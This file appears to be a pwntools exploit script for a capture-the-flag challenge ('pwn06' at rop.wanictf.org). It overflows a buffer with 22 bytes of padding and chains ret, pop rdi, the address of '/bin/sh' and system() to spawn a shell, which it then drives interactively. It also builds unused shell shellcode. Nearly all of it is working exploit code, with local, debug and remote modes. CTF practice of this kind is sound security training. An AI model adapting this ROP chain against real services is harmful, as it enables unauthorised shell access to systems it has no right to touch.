from pwn import *

binary = "./pwn06"
host ="rop.wanictf.org"
port = 9006

elf = ELF(binary)
context.binary = binary
context.log_level = "info"

breakpoints = []
commands = """
continue
"""

if len(sys.argv) >= 2 and sys.argv[1] == "r":
	# remote
	s = remote(host, port)
elif len(sys.argv) >= 2 and sys.argv[1] == "d":
	# debug
	s = gdb.debug(binary, commands)
	# libc = elf.libc
else:
	# local
	s = process(binary)
	# libc = elf.libc

shellcode = asm(shellcraft.sh())
str_bin_sh = "/bin/sh\x00"
str_bin = "/bin"
str_sh = "/sh\x00"
nop = "\x90"

payload = b"A"*22
payload += p64(next(elf.search(asm("ret;"))))
payload += p64(next(elf.search(asm("pop rdi; ret"))))
payload += p64(next(elf.search(b"/bin/sh\x00")))
payload += p64(elf.sym["system"])

s.sendlineafter(": ",payload)

sleep(1)
s.interactive()